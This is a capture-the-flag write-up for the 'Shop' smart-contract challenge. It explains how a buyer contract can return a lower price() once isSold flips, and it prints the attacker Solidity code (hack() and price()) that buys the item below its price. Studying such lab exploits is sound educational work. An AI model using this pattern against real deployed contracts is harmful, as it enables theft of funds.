# Shop

---
Objective: 
- Сan you get the item from the shop for less than the price asked?
---

The vulnerability lies in that we can interact as the Buyer with setting our own prices after returning the price with a check on how `isSold()` right after it is sold.

So in the Shop contract we have this code snippet

```solidity 
// during this call, isSold is false
if (_buyer.price() >= price && !isSold) {
// the state will change for isSold
isSold = true;
// during this call, isSold is true
price = _buyer.price();
}
```

That is where we come in. Since the switch for `isSold` is in the midst of the loop we can edit the value in our Buyer contract before it calls the price. Therefore we can write this: 
```solidity
function hack() external {
    target.buy();
    require(target.price() == 99, "price != 99");
  }

  function price() external view returns (uint) {
    if (target.isSold()) {
      return 99;
    }
    return 100;
  }
```

That will mimic the `price()` function but editing the return value after the item is sold. This makes us buy it at a lower price when we have our `hack()` function:
```solidity
function hack() external {
    target.buy();
    require(target.price() == 99, "price != 99");
  }
```

